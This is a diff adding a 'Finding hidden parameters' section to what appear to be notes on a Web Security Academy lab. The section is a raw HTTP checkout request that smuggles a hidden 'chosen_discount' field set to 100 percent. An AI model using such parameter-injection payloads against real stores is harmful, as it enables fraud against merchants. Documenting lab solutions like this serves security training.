@@ -30,3 +30,23 @@ Content-Type: application/json
 
 
 <img width="1004" height="377" alt="image" src="https://github.com/user-attachments/assets/367779e9-f6f0-4fb0-9ad0-8b37221b521a" />
+
+## Finding hidden parameters 
+```http
+POST /api/checkout HTTP/2
+Host: 0a0a00630314d65f80e82125007c00b2.web-security-academy.net
+Cookie: session=FXDUhsdOGDq2CVFbQxJM5JaizHddS84z
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a0a00630314d65f80e82125007c00b2.web-security-academy.net/cart
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Priority: u=4
+Te: trailers
+Content-Length: 90
+
+{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
+```
